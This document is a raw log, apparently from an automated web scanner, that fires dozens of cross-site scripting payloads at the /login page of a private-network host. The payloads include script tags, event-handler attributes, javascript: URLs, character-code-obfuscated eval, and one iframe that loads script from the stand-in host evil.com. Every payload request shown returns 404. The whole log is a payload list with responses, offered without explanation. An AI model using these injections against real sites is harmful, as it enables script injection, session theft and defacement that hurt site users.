+2025-01-29 22:52:07,756 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Ciframe%20src="javascript:alert('XSS')"%20width="0"%20height="0"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:07,756 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<iframe src="javascript:alert('XSS')" width="0" height="0"></iframe>: 404
+2025-01-29 22:52:07,958 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:08,159 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Ciframe%20src="http://evil.com/evil.js"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:08,159 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<iframe src="http://evil.com/evil.js"></iframe>: 404
+2025-01-29 22:52:08,353 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:08,542 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cframe%20src="javascript:alert('XSS')"%3E%3C/frame%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:08,542 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<frame src="javascript:alert('XSS')"></frame>: 404
+2025-01-29 22:52:08,732 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:08,929 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Ealert('XSS')%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:08,929 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>alert('XSS')</script>: 404
+2025-01-29 22:52:09,120 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:09,310 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cimg%20src="x"%20onerror="alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:09,310 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<img src="x" onerror="alert('XSS')">: 404
+2025-01-29 22:52:09,501 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:09,690 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Csvg/onload=alert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:09,690 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<svg/onload=alert('XSS')>: 404
+2025-01-29 22:52:09,892 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:10,095 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Ciframe%20src="javascript:alert('XSS')"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:10,095 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<iframe src="javascript:alert('XSS')"></iframe>: 404
+2025-01-29 22:52:10,292 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:10,481 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cbody%20onload=alert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:10,481 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<body onload=alert('XSS')>: 404
+2025-01-29 22:52:10,673 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:10,877 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Ca%20href="javascript:alert('XSS')"%3EClick%20me%3C/a%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:10,878 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<a href="javascript:alert('XSS')">Click me</a>: 404
+2025-01-29 22:52:11,070 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:11,260 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Csvg%3E%3Cscript%3Ealert('XSS')%3C/script%3E%3C/svg%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:11,260 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<svg><script>alert('XSS')</script></svg>: 404
+2025-01-29 22:52:11,450 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:11,644 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cmath%3E%3Cmtext%20onload="alert('XSS')"%3EXSS%3C/mtext%3E%3C/math%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:11,644 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<math><mtext onload="alert('XSS')">XSS</mtext></math>: 404
+2025-01-29 22:52:11,835 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:12,030 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Csvg/onload=alert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:12,031 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<svg/onload=alert('XSS')>: 404
+2025-01-29 22:52:12,219 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:12,410 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cembed%20src="javascript:alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:12,411 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<embed src="javascript:alert('XSS')">: 404
+2025-01-29 22:52:12,603 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:12,799 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cobject%20data="javascript:alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:12,799 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<object data="javascript:alert('XSS')">: 404
+2025-01-29 22:52:12,992 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:13,182 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cvideo%3E%3Csource%20onerror="alert('XSS')"%20src="x"%3E%3C/video%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:13,182 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<video><source onerror="alert('XSS')" src="x"></video>: 404
+2025-01-29 22:52:13,374 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:13,565 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Caudio%20onerror="alert('XSS')"%3E%3C/audio%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:13,566 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<audio onerror="alert('XSS')"></audio>: 404
+2025-01-29 22:52:13,757 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:13,948 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cdetails%20open%3E%3Csummary%20onclick="alert('XSS')"%3EXSS%3C/summary%3E%3C/details%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:13,948 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<details open><summary onclick="alert('XSS')">XSS</summary></details>: 404
+2025-01-29 22:52:14,140 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:14,335 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Carea%20shape="rect"%20coords="0,0,10,10"%20href="javascript:alert('XSS')"%20/%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:14,335 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<area shape="rect" coords="0,0,10,10" href="javascript:alert('XSS')" />: 404
+2025-01-29 22:52:14,525 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:14,725 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Ealert(document.cookie)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:14,725 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>alert(document.cookie)</script>: 404
+2025-01-29 22:52:14,926 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:15,121 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Ealert(location)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:15,122 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>alert(location)</script>: 404
+2025-01-29 22:52:15,321 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:15,514 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Ealert(1+1)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:15,514 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>alert(1+1)</script>: 404
+2025-01-29 22:52:15,708 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:15,912 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Eeval('alert("XSS")')%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:15,912 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>eval('alert("XSS")')</script>: 404
+2025-01-29 22:52:16,103 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:16,296 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Edocument.write("%3Cimg%20src='x'%20onerror='alert(1)'%20/%3E")%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:16,296 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>document.write("<img src='x' onerror='alert(1)' />")</script>: 404
+2025-01-29 22:52:16,488 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:16,687 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Csvg/onload="alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:16,687 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<svg/onload="alert('XSS')">: 404
+2025-01-29 22:52:16,880 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:17,066 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Ca%20href="javascript:alert('XSS')"%3EClick%20Here%3C/a%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:17,066 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<a href="javascript:alert('XSS')">Click Here</a>: 404
+2025-01-29 22:52:17,254 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:17,444 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cform%20action="javascript:alert('XSS')"%3E%3C/form%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:17,444 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<form action="javascript:alert('XSS')"></form>: 404
+2025-01-29 22:52:17,633 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:17,823 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Ciframe%20src="javascript:alert('XSS')"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:17,823 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<iframe src="javascript:alert('XSS')"></iframe>: 404
+2025-01-29 22:52:18,012 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:18,203 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cimg%20src="x"%20onerror="alert('XSS')"%20/%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:18,203 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<img src="x" onerror="alert('XSS')" />: 404
+2025-01-29 22:52:18,392 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:18,592 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cvideo%3E%3Csource%20onerror="alert('XSS')"%20src="x"%3E%3C/video%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:18,592 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<video><source onerror="alert('XSS')" src="x"></video>: 404
+2025-01-29 22:52:18,783 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:18,975 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Edocument.body.innerHTML%20=%20"%3Cimg%20src=x%20onerror=alert('XSS')%3E"%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:18,975 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>document.body.innerHTML = "<img src=x onerror=alert('XSS')>"</script>: 404
+2025-01-29 22:52:19,167 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:19,359 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Edocument.body.innerHTML%20=%20"%3Ca%20href=javascript:alert('XSS')%3Eclick%3C/a%3E"%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:19,360 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>document.body.innerHTML = "<a href=javascript:alert('XSS')>click</a>"</script>: 404
+2025-01-29 22:52:19,551 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:19,745 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Edocument.location="javascript:alert('XSS')"%20%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:19,745 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>document.location="javascript:alert('XSS')" </script>: 404
+2025-01-29 22:52:19,938 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:20,130 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Ewindow.location.href="javascript:alert('XSS')"%20%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:20,130 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>window.location.href="javascript:alert('XSS')" </script>: 404
+2025-01-29 22:52:20,319 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:20,514 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Elocation.replace("javascript:alert('XSS')")%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:20,514 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>location.replace("javascript:alert('XSS')")</script>: 404
+2025-01-29 22:52:20,703 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:20,895 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Edocument.write('%3Cscript%3Ealert("XSS")%3C/script%3E');%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:20,895 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>document.write('<script>alert("XSS")</script>');</script>: 404
+2025-01-29 22:52:21,090 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:21,278 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Ewindow.top.location='javascript:alert("XSS")';%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:21,278 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>window.top.location='javascript:alert("XSS")';</script>: 404
+2025-01-29 22:52:21,465 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:21,655 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cimg%20src="x"%20onerror="alert('XSS')"%20/%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:21,655 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<img src="x" onerror="alert('XSS')" />: 404
+2025-01-29 22:52:21,847 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:22,036 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cvideo%3E%3Csource%20onerror="alert('XSS')"%20src="x"%3E%3C/video%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:22,036 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<video><source onerror="alert('XSS')" src="x"></video>: 404
+2025-01-29 22:52:22,226 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:22,419 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Caudio%20onerror="alert('XSS')"%3E%3C/audio%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:22,419 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<audio onerror="alert('XSS')"></audio>: 404
+2025-01-29 22:52:22,608 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:22,798 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cembed%20src="javascript:alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:22,798 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<embed src="javascript:alert('XSS')">: 404
+2025-01-29 22:52:22,989 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:23,190 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Ciframe%20src="javascript:alert('XSS')"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:23,190 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<iframe src="javascript:alert('XSS')"></iframe>: 404
+2025-01-29 22:52:23,378 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:23,569 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Csvg/onload=alert(String.fromCharCode(88,83,83))%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:23,569 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<svg/onload=alert(String.fromCharCode(88,83,83))>: 404
+2025-01-29 22:52:23,757 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:23,949 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:23,949 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>alert(String.fromCharCode(88,83,83))</script>: 404
+2025-01-29 22:52:24,137 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:24,334 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Csvg%3E%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C/script%3E%3C/svg%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:24,334 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>: 404
+2025-01-29 22:52:24,520 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:24,706 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Csvg%3E%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C/script%3E%3C/svg%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:24,707 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>: 404
+2025-01-29 22:52:24,894 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:25,082 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:25,082 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E: 404
+2025-01-29 22:52:25,272 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:25,463 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:25,464 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E: 404
+2025-01-29 22:52:25,652 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:25,842 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:25,842 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E: 404
+2025-01-29 22:52:26,032 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:26,226 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:26,227 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E: 404
+2025-01-29 22:52:26,416 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:26,603 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Csvg%20onload%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:26,604 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=%3Csvg%20onload%3Dalert('XSS')%3E: 404
+2025-01-29 22:52:26,795 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:26,992 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Ciframe%20src%3Djavascript%3Aalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:26,993 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=%3Ciframe%20src%3Djavascript%3Aalert('XSS')%3E: 404
+2025-01-29 22:52:27,179 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:27,367 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cobject%20data%3Djavascript%3Aalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:27,367 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=%3Cobject%20data%3Djavascript%3Aalert('XSS')%3E: 404
+2025-01-29 22:52:27,555 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:27,745 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Caudio%20onerror%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:27,745 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=%3Caudio%20onerror%3Dalert('XSS')%3E: 404
+2025-01-29 22:52:27,936 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:28,132 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cdetails%20open%3E%3Csummary%20onclick%3Dalert('XSS')%3EXSS%3C%2Fsummary%3E%3C%2Fdetails%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:28,132 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=%3Cdetails%20open%3E%3Csummary%20onclick%3Dalert('XSS')%3EXSS%3C%2Fsummary%3E%3C%2Fdetails%3E: 404
+2025-01-29 22:52:28,321 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:28,515 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cinput%20onfocus="alert('XSS')"%20autofocus%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:28,516 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<input onfocus="alert('XSS')" autofocus>: 404
+2025-01-29 22:52:28,707 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:28,897 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cimg%20src="x"%20onerror="alert(1)"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:28,897 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<img src="x" onerror="alert(1)">: 404
+2025-01-29 22:52:29,088 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:29,280 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Ca%20href="javascript:alert('XSS')"%3EClick%20me%3C/a%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:29,280 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<a href="javascript:alert('XSS')">Click me</a>: 404
+2025-01-29 22:52:29,471 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:29,663 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cbutton%20onclick="alert('XSS')"%3EClick%20me%3C/button%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:29,664 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<button onclick="alert('XSS')">Click me</button>: 404
+2025-01-29 22:52:29,860 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:30,057 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cinput%20type="button"%20value="Click%20me"%20onclick="alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:30,058 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<input type="button" value="Click me" onclick="alert('XSS')">: 404
+2025-01-29 22:52:30,250 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:30,442 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Ctextarea%20onfocus="alert('XSS')"%3ETest%3C/textarea%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:30,442 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<textarea onfocus="alert('XSS')">Test</textarea>: 404
+2025-01-29 22:52:30,636 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:30,829 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Ewindow['eval']('alert("XSS")')%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:30,829 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>window['eval']('alert("XSS")')</script>: 404
+2025-01-29 22:52:31,024 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:31,214 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Ewindow['setInterval']('alert("XSS")',%201000)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:31,215 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>window['setInterval']('alert("XSS")', 1000)</script>: 404
+2025-01-29 22:52:31,405 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:31,597 - INFO - HTTP Request: GET http://172.20.10.3/login&password=%3Cscript%3Ewindow['setTimeout']('alert("XSS")',%201000)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:31,597 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&password=<script>window['setTimeout']('alert("XSS")', 1000)</script>: 404
+2025-01-29 22:52:31,787 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
